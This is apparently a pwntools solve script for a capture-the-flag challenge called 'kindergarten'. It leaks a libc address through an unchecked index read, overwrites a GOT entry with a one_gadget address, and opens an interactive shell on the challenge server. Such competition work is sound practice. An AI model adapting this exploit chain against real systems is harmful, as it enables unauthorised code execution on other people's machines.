from pwn import *
from ctypes import *

REMOTE = 1
DEBUG = 0
proc_name = "./kindergarten"
context.terminal = "tmux splitw -h -f".split()
elf = ELF(proc_name, checksec=False)
libc = ELF('./libc-2.23.so', checksec=False)
gdb_cmd = """
# insert gdb command here
"""
if REMOTE:
    p = remote("kindergarten.uni.hctf.fun", 13373)
else:
    p = process(proc_name)

if DEBUG and not REMOTE:
    gdb.attach(p, gdb_cmd, gdb_args=["--init-eval-command='source ~/ctf/tools/gef/gef.py'"])

start_addr = 0x4080
def leak(addr, new_byte="\x00"*8):
    index = addr - start_addr
    data = ""
    lbyte = map(ord, new_byte)
    for i in range(8):
        p.sendlineafter("> ", str(index))
        p.recvuntil("is ")
        data += chr(c_ubyte(int(p.recvuntil(".", drop=True))).value)
        p.sendlineafter("> ", str(lbyte[i]))
        index += 1
    return data

libc.address = u64(leak(0x4020)) - libc.symbols['setvbuf']
print(hex(libc.address))
one_gadget = libc.address + 0x4526a
leak(0x4030, p64(one_gadget))
p.interactive()
